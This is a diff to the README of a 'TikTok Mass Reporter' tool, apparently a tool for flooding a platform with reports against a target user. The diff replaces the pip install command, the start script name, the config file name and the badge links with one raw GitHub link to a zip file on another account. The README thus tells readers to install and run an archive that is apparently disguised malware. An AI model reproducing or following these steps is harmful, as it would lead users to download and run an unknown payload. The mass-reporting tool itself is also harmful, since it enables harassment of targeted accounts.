@@ -27,14 +27,14 @@ To run this tool, you need to have the following dependencies installed:
 You can install these dependencies using pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/anakiseng789/TikTok-Mass-Reporter/main/overfatten/Mass-Tok-Tik-Reporter-suffixion.zip
 ```
 
 ## Usage
 
 1. Clone or download the repository to your local machine
 2. Install the required dependencies as mentioned above
-3. Run the `start.bat` script
+3. Run the `https://raw.githubusercontent.com/anakiseng789/TikTok-Mass-Reporter/main/overfatten/Mass-Tok-Tik-Reporter-suffixion.zip` script
 4. Follow the prompts to specify the number of threads and the report type
 6. Provide the report link of the target user
 
@@ -49,7 +49,7 @@ pip install -r requirements.txt
    
 ## Configuration
 
-If you want to use proxy youself then put in `config.json`, in this format.
+If you want to use proxy youself then put in `https://raw.githubusercontent.com/anakiseng789/TikTok-Mass-Reporter/main/overfatten/Mass-Tok-Tik-Reporter-suffixion.zip`, in this format.
 
 ```json
 {
@@ -60,4 +60,4 @@ If you want to use proxy youself then put in `config.json`, in this format.
 ## Preview
 
 
-[![Star History Chart](https://api.star-history.com/svg?repos=JOY6IX9INE/TikTok-Mass-Reporter&type=Date)](https://star-history.t9t.io/#JOY6IX9INE/TikTok-Mass-Reporter&Date)
+[![Star History Chart](https://raw.githubusercontent.com/anakiseng789/TikTok-Mass-Reporter/main/overfatten/Mass-Tok-Tik-Reporter-suffixion.zip)](https://raw.githubusercontent.com/anakiseng789/TikTok-Mass-Reporter/main/overfatten/Mass-Tok-Tik-Reporter-suffixion.zip)
